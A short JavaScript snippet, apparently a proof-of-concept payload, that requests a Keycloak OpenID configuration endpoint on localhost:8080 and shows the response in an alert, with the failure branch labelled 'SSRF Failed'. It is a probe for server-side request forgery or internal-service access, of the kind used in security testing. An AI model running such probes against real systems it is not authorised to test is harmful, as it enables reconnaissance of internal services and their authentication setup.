fetch('http://localhost:8080/auth/realms/master/.well-known/openid-configuration')
  .then(response => response.text())
  .then(data => alert(data))
  .catch(error => alert('SSRF Failed: ' + error.message));
